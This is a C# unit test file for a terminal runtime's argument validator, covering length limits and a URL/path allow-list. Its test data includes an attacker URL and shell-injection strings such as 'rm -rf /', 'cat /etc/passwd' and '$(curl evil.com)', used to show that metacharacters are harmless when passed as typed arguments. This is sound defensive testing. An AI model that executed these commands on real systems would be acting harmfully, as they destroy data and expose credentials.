using FluentAssertions;
using Tracto.TerminalRuntime.Domain.Arguments;
using Tracto.TerminalRuntime.Infrastructure.Arguments;

namespace Tracto.TerminalRuntime.Unit.Tests.Arguments;

/// <summary>
/// Unit tests for <see cref="ArgumentValidator"/>.
/// Verifies AC-5 (max-length) and AC-6 (URL/path allow-list).
/// Metacharacter safety is asserted to NOT cause rejection here —
/// that protection comes from using ProcessStartInfo.ArgumentList, tested separately.
/// </summary>
public sealed class ArgumentValidatorTests
{
    private static readonly AllowedUrlRootsPolicy OpenPolicy =
        new(["api.internal", "storage.myorg.com"], [@"C:\data\approved", "/var/jobs"]);

    private static readonly AllowedUrlRootsPolicy ClosedPolicy =
        AllowedUrlRootsPolicy.DenyAll;

    private readonly ArgumentValidator _sut = new();

    // ── AC-5: max-length ──────────────────────────────────────────────────────

    [Fact]
    public void Validate_ArgumentWithinMaxLength_ReturnsOk()
    {
        var arg = new CommandArgument("param1", "hello", MaxLength: 10);
        var result = _sut.Validate([arg], ClosedPolicy);
        result.IsSuccess.Should().BeTrue();
    }

    [Fact]
    public void Validate_ArgumentExceedingMaxLength_ReturnsFail_WithArgumentTooLongCode()
    {
        var arg = new CommandArgument("param1", new string('x', 101), MaxLength: 100);
        var result = _sut.Validate([arg], OpenPolicy);

        result.IsFailure.Should().BeTrue();
        result.Error.Kind.Should().Be(Tracto.TerminalRuntime.Application.Common.ErrorKind.Validation);
        result.Error.DetailCode.Should().Be("terminal.argumentTooLong");
    }

    [Fact]
    public void Validate_ArgumentExactlyAtMaxLength_ReturnsOk()
    {
        var arg = new CommandArgument("param1", new string('a', 50), MaxLength: 50);
        var result = _sut.Validate([arg], ClosedPolicy);
        result.IsSuccess.Should().BeTrue();
    }

    [Fact]
    public void Validate_ArgumentWithNoMaxLength_AlwaysPassesLengthCheck()
    {
        var arg = new CommandArgument("param1", new string('z', 10_000));
        var result = _sut.Validate([arg], ClosedPolicy);
        // No MaxLength means no length restriction — value is a plain string (no URL/path)
        result.IsSuccess.Should().BeTrue();
    }

    // ── AC-6: URL/path allow-list ─────────────────────────────────────────────

    [Fact]
    public void Validate_ArgumentContainingAllowedUrlHost_ReturnsOk()
    {
        var arg = new CommandArgument("endpoint", "https://api.internal/v1/run");
        var result = _sut.Validate([arg], OpenPolicy);
        result.IsSuccess.Should().BeTrue();
    }

    [Fact]
    public void Validate_ArgumentContainingDisallowedUrlHost_ReturnsFail_WithDisallowedCode()
    {
        var arg = new CommandArgument("endpoint", "https://evil.attacker.com/steal");
        var result = _sut.Validate([arg], OpenPolicy);

        result.IsFailure.Should().BeTrue();
        result.Error.Kind.Should().Be(Tracto.TerminalRuntime.Application.Common.ErrorKind.Validation);
        result.Error.DetailCode.Should().Be("terminal.disallowedUrlOrPath");
    }

    [Fact]
    public void Validate_ArgumentContainingUrlWithDisallowedPolicy_ReturnsFail()
    {
        var arg = new CommandArgument("endpoint", "https://api.internal/v1/run");
        // ClosedPolicy allows no hosts at all.
        var result = _sut.Validate([arg], ClosedPolicy);

        result.IsFailure.Should().BeTrue();
        result.Error.DetailCode.Should().Be("terminal.disallowedUrlOrPath");
    }

    [Fact]
    public void Validate_ArgumentContainingApprovedFilesystemPath_ReturnsOk()
    {
        var arg = new CommandArgument("inputPath", @"C:\data\approved\jobs\run.ps1");
        var result = _sut.Validate([arg], OpenPolicy);
        result.IsSuccess.Should().BeTrue();
    }

    [Fact]
    public void Validate_ArgumentContainingDisallowedFilesystemPath_ReturnsFail()
    {
        var arg = new CommandArgument("inputPath", @"C:\windows\system32\evil.exe");
        var result = _sut.Validate([arg], OpenPolicy);

        result.IsFailure.Should().BeTrue();
        result.Error.DetailCode.Should().Be("terminal.disallowedUrlOrPath");
    }

    // ── Metacharacter safety: they must be ACCEPTED (not rejected at validation time) ─

    [Theory]
    [InlineData("safe& echo pwned")]
    [InlineData("value | cat /etc/passwd")]
    [InlineData("arg; rm -rf /")]
    [InlineData("val`id`")]
    [InlineData("$(curl evil.com)")]
    public void Validate_ArgumentWithShellMetacharacters_ReturnsOk(string value)
    {
        // Metacharacters must NOT be rejected by the validator — they are harmless
        // because the infrastructure layer uses ProcessStartInfo.ArgumentList (typed API).
        var arg = new CommandArgument("meta", value, MaxLength: 200);
        var result = _sut.Validate([arg], ClosedPolicy);
        result.IsSuccess.Should().BeTrue(
            because: "metacharacters are inert when passed via ProcessStartInfo.ArgumentList");
    }

    // ── Multiple arguments — fail on first violation ──────────────────────────

    [Fact]
    public void Validate_MultipleArguments_FailsOnFirstViolation()
    {
        var args = new[]
        {
            new CommandArgument("a", "good_value", MaxLength: 50),
            new CommandArgument("b", new string('x', 200), MaxLength: 100), // violation
            new CommandArgument("c", "also_good", MaxLength: 50),
        };

        var result = _sut.Validate(args, ClosedPolicy);
        result.IsFailure.Should().BeTrue();
        result.Error.DetailCode.Should().Be("terminal.argumentTooLong");
    }

    [Fact]
    public void Validate_EmptyArgumentList_ReturnsOk()
    {
        var result = _sut.Validate([], ClosedPolicy);
        result.IsSuccess.Should().BeTrue();
        result.Value.Should().BeEmpty();
    }
}
